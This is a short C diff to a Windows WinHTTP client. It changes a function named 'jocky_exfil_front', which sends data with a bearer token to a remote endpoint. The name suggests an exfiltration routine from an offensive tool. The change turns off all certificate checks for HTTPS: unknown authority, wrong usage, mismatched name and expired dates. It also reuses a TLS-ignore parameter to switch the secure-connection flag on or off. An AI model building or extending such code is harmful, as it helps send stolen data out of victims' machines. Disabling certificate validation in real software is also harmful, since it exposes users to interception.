@@ -100,7 +100,7 @@ static bool winhttp_request(const wchar_t* method,
     HINTERNET hReq = WinHttpOpenRequest(hConn, method, path, NULL,
                                          WINHTTP_NO_REFERER,
                                          WINHTTP_DEFAULT_ACCEPT_TYPES,
-                                         WINHTTP_FLAG_SECURE);
+                                         tls_ignore ? WINHTTP_FLAG_SECURE : 0);
     if (!hReq) {
         WinHttpCloseHandle(hConn);
         WinHttpCloseHandle(hSess);
@@ -199,9 +199,18 @@ bool jocky_exfil_front(const char* endpoint, const char* token,
     wchar_t wmethod[16];
     MultiByteToWideChar(CP_UTF8, 0, method ? method : "POST", -1, wmethod, 16);
 
+    /* Pass all TLS ignore flags for HTTPS; 0 for plain HTTP so WinHTTP
+     * doesn't attempt a TLS handshake against a plain HTTP server. */
+    DWORD tls_flags = (uc.nScheme == INTERNET_SCHEME_HTTPS)
+        ? (SECURITY_FLAG_IGNORE_UNKNOWN_CA |
+           SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
+           SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
+           SECURITY_FLAG_IGNORE_CERT_DATE_INVALID)
+        : 0;
+
     size_t data_len = strlen(data);
     return winhttp_request(wmethod, w_host, uc.nPort, w_path,
-                           SECURITY_FLAG_IGNORE_CERT_CN_INVALID,
+                           tls_flags,
                            NULL,
                            auth_hdr[0] ? auth_hdr : NULL,
                            (const uint8_t*)data, data_len);
